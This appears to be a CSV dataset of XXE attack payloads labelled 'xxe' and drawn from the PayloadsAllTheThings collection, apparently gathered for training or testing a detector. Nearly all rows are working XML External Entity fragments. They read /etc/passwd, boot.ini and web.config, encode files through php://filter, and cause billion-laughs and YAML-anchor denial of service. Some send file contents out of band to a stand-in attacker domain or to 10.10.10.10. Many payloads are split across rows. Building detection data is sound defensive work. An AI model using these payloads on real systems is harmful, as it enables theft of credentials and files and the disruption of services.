payload,label,source
"- A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF)",xxe,payloads_all_the_things
- PoC tool (based on wrapwrap & lightyear ) to demonstrate XXE in PHP with only LIBXML_DTDLOAD or LIBXML_DTDATTR flag set,xxe,payloads_all_the_things
"<!ENTITY entity_name ""entity_value"">",xxe,payloads_all_the_things
SYSTEM,xxe,payloads_all_the_things
"<!ENTITY entity_name SYSTEM ""entity_value"">",xxe,payloads_all_the_things
DOCTYPE,xxe,payloads_all_the_things
"<!--?xml version=""1.0"" ?-->",xxe,payloads_all_the_things
"<!DOCTYPE replace [<!ENTITY example ""Doe""> ]>",xxe,payloads_all_the_things
<userInfo>,xxe,payloads_all_the_things
<firstName>John</firstName>,xxe,payloads_all_the_things
<lastName>&example;</lastName>,xxe,payloads_all_the_things
</userInfo>,xxe,payloads_all_the_things
Content-Type: application/xml,xxe,payloads_all_the_things
&name;,xxe,payloads_all_the_things
%name;,xxe,payloads_all_the_things
"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",xxe,payloads_all_the_things
"<?xml version=""1.0""?>",xxe,payloads_all_the_things
<!DOCTYPE data [,xxe,payloads_all_the_things
<!ELEMENT data (#ANY)>,xxe,payloads_all_the_things
"<!ENTITY file SYSTEM ""file:///etc/passwd"">",xxe,payloads_all_the_things
]>,xxe,payloads_all_the_things
<data>&file;</data>,xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""ISO-8859-1""?>",xxe,payloads_all_the_things
<!DOCTYPE foo [,xxe,payloads_all_the_things
<!ELEMENT foo ANY >,xxe,payloads_all_the_things
"<!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]><foo>&xxe;</foo>",xxe,payloads_all_the_things
"<!ENTITY xxe SYSTEM ""file:///c:/boot.ini"" >]><foo>&xxe;</foo>",xxe,payloads_all_the_things
"<!ENTITY % xxe PUBLIC ""Random Text"" ""URL"">",xxe,payloads_all_the_things
"<!ENTITY xxe PUBLIC ""Any TEXT"" ""URL"">",xxe,payloads_all_the_things
"<!DOCTYPE test [ <!ENTITY % init SYSTEM ""data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk""> %init; ]><foo/>",xxe,payloads_all_the_things
"<!DOCTYPE replace [<!ENTITY xxe SYSTEM ""php://filter/convert.base64-encode/resource=index.php""> ]>",xxe,payloads_all_the_things
<contacts>,xxe,payloads_all_the_things
<contact>,xxe,payloads_all_the_things
<name>Jean &xxe; Dupont</name>,xxe,payloads_all_the_things
<phone>00 11 22 33 44</phone>,xxe,payloads_all_the_things
<address>42 rue du CTF</address>,xxe,payloads_all_the_things
<zipcode>75000</zipcode>,xxe,payloads_all_the_things
<city>Paris</city>,xxe,payloads_all_the_things
</contact>,xxe,payloads_all_the_things
</contacts>,xxe,payloads_all_the_things
"<!ENTITY % xxe SYSTEM ""php://filter/convert.base64-encode/resource=http://10.0.0.3"" >",xxe,payloads_all_the_things
<foo>&xxe;</foo>,xxe,payloads_all_the_things
"<foo xmlns:xi=""http://www.w3.org/2001/XInclude"">",xxe,payloads_all_the_things
"<xi:include parse=""text"" href=""file:///etc/passwd""/></foo>",xxe,payloads_all_the_things
"<!ENTITY xxe SYSTEM ""http://internal.service/secret_pass.txt"" >",xxe,payloads_all_the_things
"<!ENTITY a0 ""dos"" >",xxe,payloads_all_the_things
"<!ENTITY a1 ""&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;"">",xxe,payloads_all_the_things
"<!ENTITY a2 ""&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;"">",xxe,payloads_all_the_things
"<!ENTITY a3 ""&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;"">",xxe,payloads_all_the_things
"<!ENTITY a4 ""&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;"">",xxe,payloads_all_the_things
<data>&a4;</data>,xxe,payloads_all_the_things
"a: &a [""lol"",""lol"",""lol"",""lol"",""lol"",""lol"",""lol"",""lol"",""lol""]",xxe,payloads_all_the_things
"b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]",xxe,payloads_all_the_things
"c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]",xxe,payloads_all_the_things
"d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]",xxe,payloads_all_the_things
"e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]",xxe,payloads_all_the_things
"f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]",xxe,payloads_all_the_things
"g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]",xxe,payloads_all_the_things
"h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]",xxe,payloads_all_the_things
"i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]",xxe,payloads_all_the_things
<!DOCTYPE r [,xxe,payloads_all_the_things
"<!ENTITY % pe_1 ""<!---->"">",xxe,payloads_all_the_things
"<!ENTITY % pe_2 ""&#37;pe_1;<!---->&#37;pe_1;"">",xxe,payloads_all_the_things
"<!ENTITY % pe_3 ""&#37;pe_2;<!---->&#37;pe_2;"">",xxe,payloads_all_the_things
"<!ENTITY % pe_4 ""&#37;pe_3;<!---->&#37;pe_3;"">",xxe,payloads_all_the_things
%pe_4;,xxe,payloads_all_the_things
<r/>,xxe,payloads_all_the_things
<!DOCTYPE root [,xxe,payloads_all_the_things
"<!ENTITY % local_dtd SYSTEM ""file:///abcxyz/"">",xxe,payloads_all_the_things
%local_dtd;,xxe,payloads_all_the_things
<root></root>,xxe,payloads_all_the_things
/usr/share/xml/fontconfig/fonts.dtd,xxe,payloads_all_the_things
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd,xxe,payloads_all_the_things
/usr/share/xml/svg/svg10.dtd,xxe,payloads_all_the_things
/usr/share/xml/svg/svg11.dtd,xxe,payloads_all_the_things
/usr/share/yelp/dtd/docbookx.dtd,xxe,payloads_all_the_things
%constant,xxe,payloads_all_the_things
<!ENTITY % constant 'int|double|string|matrix|bool|charset|langset|const'>,xxe,payloads_all_the_things
<!DOCTYPE message [,xxe,payloads_all_the_things
"<!ENTITY % local_dtd SYSTEM ""file:///usr/share/xml/fontconfig/fonts.dtd"">",xxe,payloads_all_the_things
<!ENTITY % constant 'aaa)>,xxe,payloads_all_the_things
"<!ENTITY &#x25; file SYSTEM ""file:///etc/passwd"">",xxe,payloads_all_the_things
"<!ENTITY &#x25; eval ""<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>"">",xxe,payloads_all_the_things
&#x25;eval;,xxe,payloads_all_the_things
&#x25;error;,xxe,payloads_all_the_things
<!ELEMENT aa (bb'>,xxe,payloads_all_the_things
<message>Text</message>,xxe,payloads_all_the_things
"<!ENTITY % local_dtd SYSTEM ""file:///C:\Windows\System32\wbem\xml\cim20.dtd"">",xxe,payloads_all_the_things
<!ENTITY % SuperClass '>,xxe,payloads_all_the_things
"<!ENTITY &#x25; file SYSTEM ""file://D:\webserv2\services\web.config"">",xxe,payloads_all_the_things
"<!ENTITY &#x25; eval ""<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>"">",xxe,payloads_all_the_things
"<!ENTITY test ""test""'",xxe,payloads_all_the_things
]><xxx>anything</xxx>,xxe,payloads_all_the_things
"<!ENTITY &#x25; file SYSTEM ""https://erp.company.com"">",xxe,payloads_all_the_things
"<!ENTITY &#x25; eval ""<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>"">",xxe,payloads_all_the_things
"<?xml version=""1.0"" ?>",xxe,payloads_all_the_things
"<!ENTITY % ext SYSTEM ""http://[ATTACKER.DOMAIN.TLD]/ext.dtd"">",xxe,payloads_all_the_things
%ext;,xxe,payloads_all_the_things
<message></message>,xxe,payloads_all_the_things
"<!ENTITY % file SYSTEM ""file:///etc/passwd"">",xxe,payloads_all_the_things
"<!ENTITY % eval ""<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"">",xxe,payloads_all_the_things
%eval;,xxe,payloads_all_the_things
%error;,xxe,payloads_all_the_things
"<!ENTITY % data SYSTEM ""file:///etc/passwd"">",xxe,payloads_all_the_things
"<!ENTITY % eval ""<!ENTITY &#x25; leak SYSTEM '%data;:///'>"">",xxe,payloads_all_the_things
%leak;,xxe,payloads_all_the_things
&#x25;,xxe,payloads_all_the_things
"<!ENTITY % ext SYSTEM ""http://[ATTACKER.DOMAIN.TLD]/x""> %ext;",xxe,payloads_all_the_things
<r></r>,xxe,payloads_all_the_things
<!DOCTYPE root [<!ENTITY test SYSTEM 'http://[ATTACKER.DOMAIN.TLD]'>]>,xxe,payloads_all_the_things
<root>&test;</root>,xxe,payloads_all_the_things
http://[ATTACKER.DOMAIN.TLD],xxe,payloads_all_the_things
"<!ENTITY % xxe SYSTEM ""file:///etc/passwd"" >",xxe,payloads_all_the_things
"<!ENTITY callhome SYSTEM ""http://[ATTACKER.DOMAIN.TLD]/?%xxe;"">",xxe,payloads_all_the_things
<foo>&callhome;</foo>,xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""utf-8""?>",xxe,payloads_all_the_things
"<!DOCTYPE data SYSTEM ""http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd"">",xxe,payloads_all_the_things
<data>&send;</data>,xxe,payloads_all_the_things
File stored on http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd,xxe,payloads_all_the_things
"<!ENTITY % file SYSTEM ""file:///sys/power/image_size"">",xxe,payloads_all_the_things
"<!ENTITY % all ""<!ENTITY send SYSTEM 'http://[ATTACKER.DOMAIN.TLD]/?%file;'>"">",xxe,payloads_all_the_things
%all;,xxe,payloads_all_the_things
<!ELEMENT r ANY >,xxe,payloads_all_the_things
"<!ENTITY % sp SYSTEM ""http://10.10.10.10/dtd.xml"">",xxe,payloads_all_the_things
%sp;,xxe,payloads_all_the_things
%param1;,xxe,payloads_all_the_things
<r>&exfil;</r>,xxe,payloads_all_the_things
File stored on http://10.10.10.10/dtd.xml,xxe,payloads_all_the_things
"<!ENTITY % data SYSTEM ""php://filter/convert.base64-encode/resource=/etc/passwd"">",xxe,payloads_all_the_things
"<!ENTITY % param1 ""<!ENTITY exfil SYSTEM 'http://10.10.10.10/dtd.xml?%data;'>"">",xxe,payloads_all_the_things
Apache Karaf <= 4.2.1,xxe,payloads_all_the_things
Apache Karaf <= 4.1.6,xxe,payloads_all_the_things
"<?xml version=""1.0"" encoding=""UTF-8""?>",xxe,payloads_all_the_things
"<!DOCTYPE doc [<!ENTITY % dtd SYSTEM ""http://[ATTACKER.DOMAIN.TLD]""> %dtd;]",xxe,payloads_all_the_things
"<features name=""my-features"" xmlns=""http://karaf.apache.org/xmlns/features/v1.3.0"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""",xxe,payloads_all_the_things
